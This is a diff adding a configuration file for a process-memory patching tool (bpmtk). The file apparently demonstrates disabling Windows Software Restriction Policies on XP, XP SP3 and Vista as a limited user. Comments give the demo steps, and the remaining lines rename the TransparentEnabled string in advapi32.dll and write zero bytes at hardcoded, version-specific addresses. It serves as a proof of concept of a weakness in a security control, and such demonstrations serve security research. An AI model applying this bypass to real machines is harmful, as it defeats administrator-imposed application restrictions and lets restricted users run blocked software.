@@ -1,0 +1,14 @@
+#demo disable srp (software restriction policies) on XP SP2: 
+# 1 define SRP hash to disable solitaire (as local admin)
+# 1.5 logon as limited user
+# 2 start sol.exe to show it doesn't work (from start menu or cmd)
+# 3 run bpmtk this-config-file to disable srp
+# 4 start sol.exe to show it works (from start menu or cmd)
+dll-name advapi32.dll
+#rename TransparentEnabled to AransparentEnabled
+search-and-write module:. unicode:TransparentEnabled ascii:A
+#set _g_bInitializedFirstTime to 0
+write version:5.1.2600.2180 hex:77E463C8 hex:00
+write version:5.1.2600.5512 hex:77E46420 hex:00
+write version:6.0.6001.18000 hex:77D1A0A8 hex:00
+pause
